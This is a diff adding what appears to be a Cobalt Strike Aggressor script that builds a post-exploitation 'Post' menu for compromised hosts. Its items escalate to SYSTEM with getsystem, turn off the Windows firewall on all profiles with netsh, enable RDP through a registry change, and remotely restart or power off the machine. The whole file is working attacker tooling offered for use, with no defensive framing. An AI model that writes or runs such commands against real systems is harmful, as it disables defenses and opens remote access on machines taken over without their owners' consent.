@@ -1,0 +1,41 @@
+#define functions
+
+
+#append menus
+
+
+
+    menu "Post"{
+            item "Get &SYSTEM" {
+                binput($1, "getsystem");
+                bgetsystem($1);
+            }
+
+            item "Turn Off Firewall"{
+                if (!-isadmin $1['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
+                }
+            }
+
+            item "Enable RDP"{
+                local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+                }
+            }
+            menu "Power"{
+                item "Restart"{
+                    bshell($1,"shutdown -r -t 0");
+                }
+                item "Power off"{
+                    bshell($1,"shutdown -s -t 0");
+                }
+        }
+    }
